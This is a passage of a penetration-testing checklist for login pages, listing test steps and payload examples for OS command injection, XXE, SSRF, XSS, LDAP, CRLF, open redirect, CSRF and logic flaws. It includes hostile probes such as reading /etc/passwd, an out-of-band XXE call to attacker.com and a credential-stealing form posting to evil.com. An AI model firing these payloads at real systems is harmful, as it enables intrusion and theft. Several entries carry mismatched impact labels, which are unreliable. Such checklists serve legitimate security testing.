**Test Category:** Input Validation · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Params reaching an OS command

**Test Steps:** 1. Inject OS command payloads in username and password fields<br>2. Use command separators: ; | || &amp;&amp; ` $()<br>3. Test both Linux and Windows commands<br>4. Use time-based detection: sleep ping<br>5. Test with encoding and obfuscation

**Expected Result:** Application should not execute OS commands based on user input

**Payload Example:**

```
admin; sleep 5
admin | sleep 5
admin || sleep 5
admin && sleep 5
admin `sleep 5`
admin $(sleep 5)
admin; ping -c 5 127.0.0.1
admin | whoami
admin; cat /etc/passwd
```

**Impact:** OS command execution -&gt; full server compromise

**Tools:** Burp Suite / Commix / Custom Script

**References:** CWE-78; -&gt;[Command Injection checklist](#/checklist/cmdi); PortSwigger; PayloadsAllTheThings; GTFOBins

---

## INPUT-012 — XML External Entity (XXE) Injection
**Test Category:** Input Validation · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** XML request body / uploaded XML

**Test Steps:** 1. Check if login accepts XML input (Content-Type: application/xml or text/xml)<br>2. If JSON try switching Content-Type to XML<br>3. Inject XXE payload to read local files<br>4. Test for blind XXE via out-of-band<br>5. Test for SSRF via XXE

**Expected Result:** Application should disable external entity processing in XML parsers

**Payload Example:**

```
Content-Type: application/xml

<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<login><username>&xxe;</username><password>test</password></login>

Blind XXE:
<!ENTITY xxe SYSTEM "http://attacker.com/xxe">
```

**Impact:** XXE -&gt; file read / SSRF / OOB exfiltration

**Tools:** Burp Suite / Custom Script / XXEinjector

**References:** CWE-611; -&gt;[XXE checklist](#/checklist/xxe); PortSwigger XXE; OWASP XXE Prevention

---

## INPUT-013 — Server-Side Request Forgery (SSRF) via Login
**Test Category:** Input Validation · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** URL/host params (fetch/webhook/import/image)

**Test Steps:** 1. Check if login form has any URL parameters (redirect callback avatar_url)<br>2. Test URL parameters with internal addresses<br>3. Test with cloud metadata endpoints<br>4. Check if any parameter fetches remote resources<br>5. Test with different URL schemes: file:// gopher:// dict://

**Expected Result:** Application should validate and whitelist URLs preventing access to internal resources and cloud metadata

**Payload Example:**

```
redirect=http://127.0.0.1
redirect=http://169.254.169.254/latest/meta-data/
redirect=http://[::1]
callback=http://internal-server/
url=file:///etc/passwd
url=gopher://127.0.0.1:25/
url=dict://127.0.0.1:6379/
```

**Impact:** Internal service access, cloud-metadata theft, potential RCE

**Tools:** Burp Suite / SSRFmap / Custom Script

**References:** CWE-918; -&gt;[SSRF checklist](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF'; PortSwigger SSRF

---

## INPUT-015 — LDAP Injection in Login Fields
**Test Category:** Input Validation · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Auth/search fields reaching an LDAP filter

**Test Steps:** 1. Inject LDAP metacharacters in username: * ( ) | &amp; =<br>2. Test LDAP filter manipulation<br>3. Test for blind LDAP injection<br>4. Monitor for LDAP-specific error messages<br>5. Test authentication bypass via LDAP injection

**Expected Result:** Application should escape LDAP special characters and use parameterized LDAP queries

**Payload Example:**

```
admin)(|(password=*
*
admin)(&
)(cn=*)(|(cn=*
*)(uid=*))(|(uid=*
admin)(!(&(1=0
```

**Impact:** LDAP filter injection -&gt; authN bypass &amp; directory disclosure

**Tools:** Burp Suite / Custom Script

**References:** CWE-90; -&gt;[LDAP Injection checklist](#/checklist/ldap); OWASP LDAP Injection; PayloadsAllTheThings

---

## INPUT-017 — Deserialization Vulnerability Testing
**Test Category:** Input Validation · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Serialized object in params/cookies/body

**Test Steps:** 1. Check if application uses serialized objects<br>2. Test Java deserialization with ysoserial payloads<br>3. Test PHP deserialization with phpggc<br>4. Test .NET deserialization<br>5. Check for gadget chains

**Expected Result:** Application should not deserialize untrusted data

**Payload Example:**

```
Java: rO0ABXNyABFqYXZhLnV0aWwuQXJyYXlMaXN0eIHSHZnHYZ0DAAFJAARzaXplWw...

PHP: a:2:{i:0;O:8:"stdClass":0:{};i:1;s:4:"test";} with __destruct
```

**Impact:** Insecure deserialization -&gt; RCE

**Tools:** Burp Suite / ysoserial / phpggc

**References:** CWE-502; -&gt;[Insecure Deserialization checklist](#/checklist/deser); frohoff/ysoserial; Bechler marshalsec

---

## INPUT-019 — NoSQL Injection - Blind
**Test Category:** Input Validation · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Params / body / query reaching a SQL query

**Test Steps:** 1. Test blind NoSQL injection with timing<br>2. Use $where operator for JavaScript injection<br>3. Test regex injection<br>4. Check for information disclosure via errors

**Expected Result:** Application should sanitize NoSQL queries

**Payload Example:**

```
username[$where]=sleep(1000)
username[$regex]=.*
Check response times
```

**Impact:** SQL injection -&gt; authN bypass, DB read/modify, potential RCE

**Tools:** NoSQLMap / Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## INPUT-001 — Reflected XSS in Username Field
**Test Category:** Input Validation · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Reflected/stored/DOM input rendered in a page

**Test Steps:** 1. Enter XSS payloads in the username field<br>2. Submit the login form<br>3. Check if payload is reflected in response without encoding<br>4. Test with various payloads to bypass filters<br>5. Check if error message reflects username input<br>6. Test with event handlers if script tags are filtered

**Expected Result:** All user input should be properly encoded/escaped in output. No XSS payload should execute in the browser

**Payload Example:**

```
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>
"><script>alert(1)</script>
'><img src=x onerror=alert(1)>
javascript:alert(1)
<details/open/ontoggle=alert(1)>
<body onload=alert(1)>
```

**Impact:** Script executes in victim context -&gt; session/token theft

**Tools:** Burp Suite / XSStrike / Dalfox / Browser

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS (Gareth Heyes); PayloadsAllTheThings

---

## INPUT-002 — Reflected XSS in Password Field
**Test Category:** Input Validation · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Reflected/stored/DOM input rendered in a page

**Test Steps:** 1. Enter XSS payloads in the password field<br>2. Submit the login form<br>3. Check if password value is reflected anywhere in response<br>4. Even if masked on input check response source<br>5. Test with various encoding to bypass filters

**Expected Result:** Password field input should never be reflected in HTTP responses

**Payload Example:**

```
<script>alert(1)</script>
<img src=x onerror=alert(1)>
"><svg/onload=alert(1)>
Test in password field and check page source for reflection
```

**Impact:** Script executes in victim context -&gt; session/token theft

**Tools:** Burp Suite / XSStrike / Dalfox

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS (Gareth Heyes); PayloadsAllTheThings

---

## INPUT-003 — Reflected XSS in Error Messages
**Test Category:** Input Validation · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Reflected/stored/DOM input rendered in a page

**Test Steps:** 1. Trigger various error conditions on login page<br>2. Check if any user input is reflected in error messages<br>3. Test URL parameters for reflection<br>4. Test path-based reflection<br>5. Test custom parameters

**Expected Result:** Error messages should use static text or properly encode any reflected user input

**Payload Example:**

```
GET /login?error=<script>alert(1)</script>
GET /login?msg=<img+src=x+onerror=alert(1)>
GET /login?redirect=javascript:alert(1)
GET /login/<svg/onload=alert(1)>
```

**Impact:** Script executes in victim context -&gt; session/token theft

**Tools:** Burp Suite / XSStrike / Dalfox / Browser

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS (Gareth Heyes); PayloadsAllTheThings

---

## INPUT-004 — XSS Filter Bypass Techniques
**Test Category:** Input Validation · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Reflected/stored/DOM input rendered in a page

**Test Steps:** 1. Test case variation: &lt;ScRiPt&gt;alert(1)&lt;/ScRiPt&gt;<br>2. Test encoding bypasses: URL encoding double encoding HTML entities<br>3. Test null bytes: &lt;scr%00ipt&gt;alert(1)&lt;/scr%00ipt&gt;<br>4. Test without parentheses: &lt;img src=x onerror=alert`1`&gt;<br>5. Test polyglot payloads<br>6. Test DOM-based XSS via URL fragments<br>7. Test mutation XSS payloads

**Expected Result:** XSS filters should not be bypassable with encoding case changes or obfuscation techniques

**Payload Example:**

```
<ScRiPt>alert(1)</ScRiPt>
<scr%00ipt>alert(1)</scr%00ipt>
<img src=x onerror=alert`1`>
<svg/onload=prompt(1)>
<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcLiCk=alert() )//
%3Cscript%3Ealert(1)%3C/script%3E
```

**Impact:** Script executes in victim context -&gt; session/token theft

**Tools:** Burp Suite / XSStrike / Dalfox / Custom Payloads

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS (Gareth Heyes); PayloadsAllTheThings

---

## INPUT-005 — DOM-Based XSS Testing
**Test Category:** Input Validation · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Reflected/stored/DOM input rendered in a page

**Test Steps:** 1. Analyze JavaScript source for dangerous sinks: innerHTML document.write eval setTimeout<br>2. Check if URL hash fragment is processed by JavaScript<br>3. Check if URL parameters are read by JavaScript (location.search location.hash)<br>4. Test payloads via URL fragment: #&lt;img src=x onerror=alert(1)&gt;<br>5. Test via URL parameters processed client-side

**Expected Result:** JavaScript should not use dangerous sinks with unsanitized user input. DOM manipulation should use safe APIs like textContent

**Payload Example:**

```
https://target.com/login#<img src=x onerror=alert(1)>
https://target.com/login?next=javascript:alert(1)
https://target.com/login?returnUrl=data:text/html,<script>alert(1)</script>

Check JS for:
document.getElementById('x').innerHTML = location.hash
```

**Impact:** Script executes in victim context -&gt; session/token theft

**Tools:** Burp Suite DOM Invader / Browser DevTools / Custom Analysis

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS (Gareth Heyes); PayloadsAllTheThings

---

## INPUT-016 — Mass Assignment / Parameter Tampering
**Test Category:** Input Validation · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Object identifier in path/param/body

**Test Steps:** 1. Add extra parameters to login request: role=admin isAdmin=true verified=true<br>2. Test adding user object properties<br>3. Test with JSON body adding extra fields<br>4. Test modifying hidden form fields<br>5. Check if any extra parameters affect authentication or authorization

**Expected Result:** Application should whitelist accepted parameters and ignore unexpected parameters

**Payload Example:**

```
POST /login
username=admin&password=test&role=admin&isAdmin=true&verified=true&active=true

JSON:
{"username":"admin","password":"test","role":"admin","isAdmin":true,"id":1}
```

**Impact:** IDOR/BOLA -&gt; access or modify other users' records

**Tools:** Burp Suite / Custom Script

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1/BOLA

---

## INPUT-020 — GraphQL Injection Testing
**Test Category:** Input Validation · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** API endpoint (REST/GraphQL) — auth/authz

**Test Steps:** 1. Check if GraphQL endpoint exists<br>2. Test GraphQL injection in queries<br>3. Test introspection query exposure<br>4. Test field suggestion enumeration<br>5. Check for GraphQL-specific injections

**Expected Result:** GraphQL should not allow injection and introspection should be disabled

**Payload Example:**

```
query { user(id: "1 OR 1=1") }
Introspection: query { __schema { types { name } } }
```

**Impact:** API authz/authn flaw -&gt; data access or priv-esc

**Tools:** Burp Suite / GraphQL Voyager / InQL

**References:** CWE-284; -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP API Security Top 10; -&gt;[API master checklist](#/checklist/api)

---

## INPUT-006 — HTML Injection Testing
**Test Category:** Input Validation · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Params / body / query reaching a SQL query

**Test Steps:** 1. Inject HTML tags in username field<br>2. Inject HTML tags in password field<br>3. Check if HTML renders in response<br>4. Test form injection to create phishing form<br>5. Test with content injection that could mislead users

**Expected Result:** Application should encode all HTML special characters preventing HTML injection

**Payload Example:**

```
<h1>Injected</h1>
<form action='https://evil.com/steal'><input name='user'><input name='pass' type='password'><input type='submit' value='Login'></form>
<a href='https://evil.com'>Click here to login</a>
<marquee>Account Suspended</marquee>
```

**Impact:** SQL injection -&gt; authN bypass, DB read/modify, potential RCE

**Tools:** Burp Suite / Browser

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## INPUT-009 — CRLF Injection Testing
**Test Category:** Input Validation · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Host / X-Forwarded / CRLF-reaching headers

**Test Steps:** 1. Inject CRLF characters (%0d%0a) in input fields<br>2. Test in URL parameters<br>3. Check if response headers can be injected<br>4. Test for HTTP response splitting<br>5. Try injecting Set-Cookie header via CRLF

**Expected Result:** Application should strip or encode CRLF characters preventing header injection and response splitting

**Payload Example:**

```
username=admin%0d%0aSet-Cookie:%20evil=1
username=admin%0d%0a%0d%0a<html>injected</html>
/login?param=value%0d%0aInjected-Header:%20true
/login?param=value%0d%0aLocation:%20https://evil.com
```

**Impact:** Header/CRLF injection -&gt; cache poisoning &amp; response splitting

**Tools:** Burp Suite / CRLFuzz / Custom Script

**References:** CWE-93; -&gt;[Host Header Injection checklist](#/checklist/hostheader); James Kettle 'Cracking the Lens'; PortSwigger

---

## INPUT-010 — HTTP Parameter Pollution
**Test Category:** Input Validation · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Business-flow parameters (price/qty/coupon/state)

**Test Steps:** 1. Send duplicate parameters with different values<br>2. Test: username=admin&amp;username=attacker<br>3. Check which value the application uses (first last combined)<br>4. Test with different parameter positions<br>5. Test with array notation: username[]=admin&amp;username[]=attacker

**Expected Result:** Application should handle duplicate parameters consistently and securely

**Payload Example:**

```
POST /login
username=admin&password=test&username=attacker
username=victim&username=attacker&password=test

GET /login?username=admin&username=attacker

username[0]=admin&username[1]=attacker
```

**Impact:** Workflow/flow abuse -&gt; financial or state manipulation

**Tools:** Burp Suite / Custom Script

**References:** CWE-840; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Business logic; OWASP WSTG-BUSLOGIC

---

## INPUT-011 — Unicode and Encoding Bypass
**Test Category:** Input Validation · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** WAF/filter in front of the app

**Test Steps:** 1. Test Unicode normalization attacks: admin vs ?dmin<br>2. Test double URL encoding: %2527 for single quote<br>3. Test UTF-8 encoding variations<br>4. Test overlong UTF-8 encoding<br>5. Test null byte injection: admin%00<br>6. Test with different character encodings

**Expected Result:** Application should properly handle Unicode normalization and encoding variations preventing bypass of security controls

**Payload Example:**

```
admin%00 (null byte)
%2527 (double encoded single quote)
admin\u0000 (unicode null)
%c0%a7 (overlong encoding of single quote)
?dmin (unicode lookalike for 'a')
%ef%bc%87 (fullwidth apostrophe)
admin%e2%80%8b (zero-width space)
```

**Impact:** WAF/filter bypass delivering blocked payloads to sinks

**Tools:** Burp Suite / Custom Script

**References:** CWE-693; -&gt;[WAF / Filter Bypass checklist](#/checklist/wafbypass); PayloadsAllTheThings WAF evasion; -&gt;waf_filter_bypass.csv

---

## INPUT-014 — Open Redirect Testing
**Test Category:** Input Validation · **Severity:** Medium · **CVSS:** 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

**Where to Test / Injection Point:** redirect/return/next/url parameter

**Test Steps:** 1. Check for redirect/return/next/url/continue/goto parameters<br>2. Test with external URLs in redirect parameters<br>3. Test bypass techniques: //evil.com /\evil.com<br>4. Test with URL encoding and double encoding<br>5. Test with whitelisted domain as subdomain of attacker

**Expected Result:** Redirect parameters should only allow redirects to whitelisted internal URLs. External redirects should be blocked

**Payload Example:**

```
GET /login?redirect=https://evil.com
GET /login?next=//evil.com
GET /login?returnUrl=/\evil.com
GET /login?url=https://target.com@evil.com
GET /login?redirect=https://evil.com%23.target.com
GET /login?next=////evil.com
GET /login?continue=https://target.com.evil.com
GET /login?goto=data:text/html,<script>alert(1)</script>
```

**Impact:** Redirect abuse -&gt; phishing / OAuth token theft

**Tools:** Burp Suite / OpenRedireX / Custom Script

**References:** CWE-601; -&gt;[Open Redirect checklist](#/checklist/openredir); PortSwigger; disclosed OAuth-redirect writeups

---

## INPUT-018 — Log Injection Testing
**Test Category:** Input Validation · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Params / body / query reaching a SQL query

**Test Steps:** 1. Inject log injection payloads in username/password<br>2. Check server logs for injection<br>3. Test CRLF in logs<br>4. Test command injection via logs if logs are processed

**Expected Result:** Logs should be properly sanitized

**Payload Example:**

```
username=admin%0a%0dINJECTED_LOG_LINE
Check logs for new lines
```

**Impact:** SQL injection -&gt; authN bypass, DB read/modify, potential RCE

**Tools:** Burp Suite / Custom Script

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## LOGIC-006 — Password Reset Token Prediction
**Test Category:** Business Logic · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Password-reset flow — token/email/Host header

**Test Steps:** 1. Request multiple password reset tokens<br>2. Analyze token patterns<br>3. Test sequential tokens<br>4. Test time-based tokens<br>5. Attempt to predict next token

**Expected Result:** Reset tokens should be unpredictable

**Payload Example:**

```
Request 10 tokens and check for patterns like incrementing numbers or timestamp + counter
```

**Impact:** Reset-flow flaw -&gt; pre-auth account takeover

**Tools:** Burp Suite / Custom Script

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed reset-ATO writeups

---

## LOGIC-003 — Insufficient Anti-Automation
**Test Category:** Business Logic · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Business-flow parameters (price/qty/coupon/state)

**Test Steps:** 1. Verify if automated login attempts are detected<br>2. Check for CAPTCHAs progressive delays or blocking<br>3. Test if bot detection is implemented<br>4. Check for JavaScript-based bot detection (headless browser detection)<br>5. Test if automation detection can be bypassed

**Expected Result:** Application should implement progressive security measures against automation: CAPTCHA after failures delays IP blocking

**Payload Example:**

```
Automated login script:
for password in wordlist:
    requests.post('/login', data={'username':'admin','password':password})
    
Check if any anti-automation triggers after 10/50/100 attempts
```

**Impact:** Workflow/flow abuse -&gt; financial or state manipulation

**Tools:** Custom Python Script / Selenium / Burp Suite

**References:** CWE-840; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Business logic; OWASP WSTG-BUSLOGIC

---

## LOGIC-007 — Account Recovery Bypass
**Test Category:** Business Logic · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Business-flow parameters (price/qty/coupon/state)

**Test Steps:** 1. Test alternative recovery methods<br>2. Check if recovery questions are weak<br>3. Test recovery via phone/email<br>4. Check if recovery can be bypassed<br>5. Test recovery link expiration

**Expected Result:** Recovery should be secure and not bypassable

**Payload Example:**

```
Use weak recovery answers
Test expired recovery links
```

**Impact:** Workflow/flow abuse -&gt; financial or state manipulation

**Tools:** Burp Suite

**References:** CWE-840; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Business logic; OWASP WSTG-BUSLOGIC

---

## LOGIC-001 — CAPTCHA Implementation Testing
**Test Category:** Business Logic · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Business-flow parameters (price/qty/coupon/state)

**Test Steps:** 1. Check if CAPTCHA exists on login page<br>2. Check if CAPTCHA appears after failed attempts<br>3. Test if CAPTCHA can be bypassed by removing parameter<br>4. Test if same CAPTCHA solution can be reused<br>5. Test if CAPTCHA is validated server-side<br>6. Test if changing request from AJAX to direct form submission bypasses CAPTCHA<br>7. Test CAPTCHA OCR bypass

**Expected Result:** CAPTCHA should be present and properly validated server-side. Should not be reusable bypassable or solvable via OCR

**Payload Example:**

```
Remove captcha parameter from request
Reuse old captcha value
Send empty captcha value
captcha=
Remove entire CAPTCHA-related parameters
Use anti-captcha services for testing
```

**Impact:** Workflow/flow abuse -&gt; financial or state manipulation

**Tools:** Burp Suite / Custom Script / OCR Tools

**References:** CWE-840; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Business logic; OWASP WSTG-BUSLOGIC

---

## LOGIC-002 — Race Condition on Login
**Test Category:** Business Logic · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Concurrent requests to a state-changing endpoint

**Test Steps:** 1. Send multiple identical login requests simultaneously<br>2. Test with 10-50 concurrent requests<br>3. Check if rate limiting can be bypassed via race condition<br>4. Test if simultaneous requests with same credentials cause issues<br>5. Check for time-of-check to time-of-use (TOCTOU) vulnerabilities

**Expected Result:** Login should handle concurrent requests safely without bypassing rate limits or causing authentication inconsistencies

**Payload Example:**

```
Use Burp Turbo Intruder or race-the-web:
Send 50 simultaneous POST /login requests
with same credentials

Python threading example:
import threading
threads = [threading.Thread(target=login_attempt) for _ in range(50)]
for t in threads: t.start()
```

**Impact:** TOCTOU race -&gt; limit bypass / double-spend

**Tools:** Burp Suite Turbo Intruder / Custom Python Script / race-the-web

**References:** CWE-362; -&gt;[Race Condition checklist](#/checklist/racecondition); James Kettle 'Smashing the State Machine'; Turbo Intruder

---

## LOGIC-004 — Login Page Denial of Service
**Test Category:** Business Logic · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Business-flow parameters (price/qty/coupon/state)

**Test Steps:** 1. Test with extremely long username (10000+ characters)<br>2. Test with extremely long password (10000+ characters)<br>3. Send large number of parameters<br>4. Send oversized request body<br>5. Test with deeply nested JSON if applicable<br>6. Check for ReDoS in input validation patterns

**Expected Result:** Application should enforce input length limits and handle oversized inputs gracefully without crashing or excessive resource consumption

**Payload Example:**

```
username=AAAA...(100000 chars)&password=test
username=test&password=AAAA...(100000 chars)

Large parameter count:
param1=a&param2=a&...&param10000=a

Nested JSON:
{"a":{"a":{"a":{...}}}}
```

**Impact:** Workflow/flow abuse -&gt; financial or state manipulation

**Tools:** Burp Suite / Custom Script

**References:** CWE-840; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Business logic; OWASP WSTG-BUSLOGIC

---

## LOGIC-005 — Password Policy Bypass
**Test Category:** Business Logic · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Business-flow parameters (price/qty/coupon/state)

**Test Steps:** 1. If registration is possible test password policy enforcement<br>2. Test minimum password length<br>3. Test if common passwords are blocked<br>4. Test if password complexity is enforced<br>5. Test if password is checked against known breach databases<br>6. Test password policy on client-side vs server-side

**Expected Result:** Password policy should be enforced server-side with minimum length complexity requirements and breach database checking

**Payload Example:**

```
Test passwords:
a (1 char)
12345 (only numbers)
password (common password)
aaaaaa (no complexity)
Check if validation is only client-side by intercepting request
```

**Impact:** Workflow/flow abuse -&gt; financial or state manipulation

**Tools:** Burp Suite / Manual Testing

**References:** CWE-840; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Business logic; OWASP WSTG-BUSLOGIC

---

## LOGIC-008 — Infinite Loop DoS
**Test Category:** Business Logic · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Business-flow parameters (price/qty/coupon/state)

**Test Steps:** 1. Test recursive redirects<br>2. Test self-referencing forms<br>3. Test infinite loops in business logic<br>4. Check for ReDoS in regex patterns

**Expected Result:** Application should prevent infinite loops and excessive recursion

**Payload Example:**

```
Create self-referencing redirect
Test regex with catastrophic backtracking
```

**Impact:** Workflow/flow abuse -&gt; financial or state manipulation

**Tools:** Burp Suite / Custom Script

**References:** CWE-840; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Business logic; OWASP WSTG-BUSLOGIC

---

## CLIENT-004 — Content Security Policy Bypass
**Test Category:** Client-Side · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Reflected/stored/DOM input rendered in a page

**Test Steps:** 1. Check CSP header<br>2. Test CSP bypass techniques<br>3. Test JSONP endpoints<br>4. Test base tag injection<br>5. Test CSP nonce bypass

**Expected Result:** CSP should be properly configured and not bypassable

**Payload Example:**

```
Test CSP: default-src 'self'
Bypass: <base href="//evil.com">
Or JSONP: /api/data?callback=alert(1)
```

**Impact:** Script executes in victim context -&gt; session/token theft

**Tools:** Burp Suite / CSP Evaluator

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS (Gareth Heyes); PayloadsAllTheThings

---

## CSRF-001 — CSRF on Login Form (Login CSRF)
**Test Category:** Client-Side · **Severity:** Medium · **CVSS:** 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

**Where to Test / Injection Point:** State-changing endpoint under cookie auth

**Test Steps:** 1. Analyze login form for CSRF token<br>2. Check if CSRF token is present and validated<br>3. Try submitting login without CSRF token<br>4. Try with empty CSRF token<br>5. Try with token from different session<br>6. Create auto-submitting form to test login CSRF<br>7. Check SameSite cookie attribute

**Expected Result:** Login form should include a valid CSRF token that is validated server-side. SameSite cookie attribute should be set

**Payload Example:**

```
<html>
<body onload="document.forms[0].submit()">
<form action="https://target.com/login" method="POST">
<input name="username" value="attacker">
<input name="password" value="password">
</form>
</body>
</html>

Test without token:
Remove csrf_token parameter from request
```

**Impact:** Forced state-changing request in the victim's session

**Tools:** Burp Suite / Custom HTML

**References:** CWE-352; -&gt;[CSRF checklist](#/checklist/csrf); PortSwigger CSRF; OWASP CSRF Cheat Sheet

---

## CLICKJACK-001 — Clickjacking on Login Page
**Test Category:** Client-Side · **Severity:** Medium · **CVSS:** 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

**Where to Test / Injection Point:** Framable state-changing page (missing XFO/CSP)

**Test Steps:** 1. Create HTML page with iframe pointing to target login page<br>2. Check if login page loads inside iframe<br>3. Verify X-Frame-Options header<br>4. Check Content-Security-Policy frame-ancestors directive<br>5. Test with sandbox attribute on iframe

**Expected Result:** Login page should not be frameable. X-Frame-Options: DENY or Content-Security-Policy: frame-ancestors 'none' should be set

**Payload Example:**

```
<html>
<body>
<h1>Clickjacking Test</h1>
<iframe src="https://target.com/login" width="800" height="600"></iframe>
</body>
</html>

Save as HTML file and open in browser
```

**Impact:** UI-redress tricks victim into unintended actions

**Tools:** Browser / Custom HTML / Burp Suite

**References:** CWE-1021; -&gt;[CSRF checklist](#/checklist/csrf); OWASP Clickjacking; PortSwigger clickjacking

---

## CLIENT-001 — Client-Side Input Validation Bypass
**Test Category:** Client-Side · **Severity:** Medium · **CVSS:** 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

**Where to Test / Injection Point:** Reflected/stored/DOM input rendered in a page

**Test Steps:** 1. Identify client-side JavaScript validation on login form<br>2. Disable JavaScript in browser and submit form<br>3. Intercept request in proxy and modify validated values<br>4. Remove maxlength restrictions from input fields<br>5. Bypass HTML5 validation attributes (required pattern)<br>6. Test if server-side validation exists independently

**Expected Result:** All input validation must be enforced server-side. Client-side validation is only for UX and should not be relied upon for security

**Payload Example:**

```
Disable JS and submit:
username= (empty)
password= (empty)

Modify maxlength:
Change maxlength="20" to maxlength="10000"

Remove required attribute and submit empty form
```

